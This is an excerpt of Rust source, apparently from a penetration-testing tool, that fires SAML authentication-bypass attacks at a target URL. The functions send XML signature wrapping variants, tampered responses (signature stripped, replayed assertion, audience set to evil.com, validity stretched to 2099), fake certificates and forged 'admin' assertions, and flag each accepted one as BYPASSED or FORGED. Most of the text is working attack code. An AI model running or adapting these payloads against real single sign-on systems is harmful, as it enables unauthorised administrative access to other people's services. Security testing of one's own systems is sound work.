...
pub async fn xsw(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    ...
    println!("{} {} XSW variants", "[*]".cyan().bold(), XSW_PAYLOADS.len());
    ...
    for (i, payload) in XSW_PAYLOADS.iter().enumerate() {
        ...
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                ...
                let bypassed = body.contains("admin") || body.contains("authenticated") || body.contains("success") || status == 200;
                let tag = if bypassed { "BYPASSED".red().bold().to_string() } else { "rejected".green().to_string() };
                println!("  {} XSW variant {} status={} {}", "*".cyan(), i + 1, status, tag);
                if bypassed { println!("    {} Response: {}", ">".red().bold(), body.chars().take(300).collect::<String>()); results.push(true); }
            }
            Err(_) => { println!("  {} XSW variant {} error", "*".red(), i + 1); }
        }
    }

    println!("\n{} {} / {} XSW attacks succeeded", "[*]".cyan().bold(), results.len(), XSW_PAYLOADS.len());
    Ok(())
}
...
pub async fn response(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    ...
    let client = build_client(timeout);
    let manipulations = [
        ("Remove signature", r#"{"saml_response":"<Response><Assertion><Subject>admin</Subject></Assertion></Response>","strip_signature":true}"#),
        ("Replay assertion", r#"{"saml_response":"<Response><Assertion ID='_replay'><Subject>admin</Subject></Assertion></Response>","replay":true}"#),
        ("Modify recipient", r#"{"saml_response":"<Response><Assertion><Subject>admin</Subject><Conditions><AudienceRestriction>https://evil.com</AudienceRestriction></Conditions></Assertion></Response>"}"#),
        ("Extend validity", r#"{"saml_response":"<Response><Assertion><Subject>admin</Subject><Conditions NotOnOrAfter='2099-12-31T23:59:59Z'/></Assertion></Response>"}"#),
    ];
    ...
    for (name, payload) in &manipulations {
        ...
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let success = body.contains("admin") || body.contains("authenticated") || status == 200;
                let tag = if success { "ACCEPTED".red().bold().to_string() } else { "rejected".green().to_string() };
    ...
    println!("\n{} {} / {} manipulations accepted", "[*]".cyan().bold(), results.len(), manipulations.len());
    Ok(())
}
...
pub async fn cert(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let client = build_client(timeout);
    let cert_tests = [
        ("Self-signed cert", r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...ATTACKER...\n-----END CERTIFICATE-----"}"#),
        ("Wrong issuer cert", r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...WRONGISSUER...\n-----END CERTIFICATE-----"}"#),
        ("Expired cert", r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...EXPIRED2000...\n-----END CERTIFICATE-----"}"#),
        ("Attacker cert match", r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...SAMENAMEATTACKER...\n-----END CERTIFICATE-----"}"#),
    ];
    ...
    println!("\n{} {} / {} cert tests accepted", "[*]".cyan().bold(), results.len(), cert_tests.len());
    Ok(())
}
...
pub async fn assertion(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    ...
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} {} forged assertions", "[*]".cyan().bold(), ASSERTION_FORGE.len());
    println!("{}", "-".repeat(60).dimmed());
    ...
    for (i, payload) in ASSERTION_FORGE.iter().enumerate() {
        ...
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accepted = body.contains("admin") || body.contains("authenticated") || body.contains("success") || status == 200;
                let tag = if accepted { "FORGED".red().bold().to_string() } else { "rejected".green().to_string() };
                println!("  {} Assertion {} status={} {}", "*".cyan(), i + 1, status, tag);
                if accepted { println!("    {} Response: {}", ">".red().bold(), body.chars().take(300).collect::<String>()); results.push(true); }
            }
            Err(_) => { println!("  {} Assertion {} error", "*".red(), i + 1); }
        }
    }

    println!("\n{} {} / {} forged assertions accepted", "[*]".cyan().bold(), results.len(), ASSERTION_FORGE.len());
    Ok(())
}
